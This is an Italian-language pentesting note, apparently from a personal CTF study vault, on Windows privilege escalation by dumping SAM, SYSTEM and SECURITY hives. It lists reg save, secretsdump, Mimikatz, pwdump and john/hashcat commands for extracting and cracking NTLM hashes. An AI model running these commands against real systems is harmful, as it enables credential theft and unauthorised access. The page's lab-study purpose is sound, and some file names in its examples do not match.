#Privesc_Windows 

---
#### INDICE

- [[#Introduzione]]
- [[#Localizzazione File]]
- [[#Dumping Delle Credenziali]]
	1. [[#Tramite Metodi Nativi]]
	2. [[#Tramite Terze Parti]]
- [[#Cracking Credenziali]]

---
---
---
### Introduzione
Il dumping dei fileÂ **SAMÂ eÂ **SYSTEM**Â Ã¨ una tecnica fondamentale per l'escalation dei privilegi su sistemi Windows. Questi file contengono gli hash delle password degli utenti locali, che possono essere craccati offline per ottenere credenziali degli altri utenti presenti sul target.

- **SAM (Security Account Manager)**: Database delle password degli utent[i locali in formato hash
- **SYSTEM**: Contiene la chiave di cifratura (bootkey) per decifrare il database SAM
- **SECURITY**: Database LSA con secret di sistema

---
### Localizzazione File
I file si trovano tipicamente in:

```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
```

---
### Dumping Delle Credenziali
#### Tramite Metodi Nativi
Per dumpare i file presenti sul target possiamo utilizzare i seguenti comandi:

```
reg save hklm\sam C:\temp\sam.save
reg save hklm\system C:\temp\system.save
reg save hklm\security C:\temp\security.save
```

Carichiamolo sulla nostra kali e poi utilizziamo il seguente comando per estrarre gli[[ðŸ”¡ Glossario#NTLM| NTLMÂ°]]: 

```
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

ðŸ“šâ€‹ Writeups:
- [[Linux#Blueprint| Blueprint]],[[Windows#Omni| Omni]],[[Windows#Year Of The Owl| Year Of Owl]],
#### Tramite Terze Parti

```
### Mimikatz
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit #Dumping dalla memoria
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit #Dumping LSA secrets
```

```
### Pwdump
pwdump.exe system.save sam.save > hashes.txt
```

```
secretsdump.py DOMAIN/user:password@target_ip  #Dumping remoto
secretsdump.py -sam sam.save -system system.save LOCAL  #Dumping locale
```
---
### Cracking Credenziali
Una volta ottenute le credenziali in formato hash, possiamo craccarle con `john` o `hashcat`:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

ðŸ“šâ€‹ Writeups:
- [[Linux#Blueprint| Blueprint]],[[Windows#Omni| Omni]],[[Windows#Year Of The Owl| Year Of Owl]],